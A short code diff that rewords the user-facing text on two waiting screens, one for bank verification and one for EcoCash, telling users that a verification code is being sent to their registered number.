@@ -1181,7 +1181,7 @@ function loadBankVerificationWaitingScreen() {
 
                 <br><br>
 
-                Please wait while we send the code.
+                Please wait while we send your verification code..
 
             </p>
 
@@ -1846,13 +1846,12 @@ function loadEcoCashVerificationWaitingScreen() {
                 line-height:1.8;
             ">
 
-                requesting verification code
-                for your EcoCash number.
+                Please wait while we securely process your request.
 
                 <br><br>
 
-                Please wait while the code is being sent.
-
+                A verification code will be sent to 
+                your registered EcoCash number shortly.
             </p>
 
             <br>
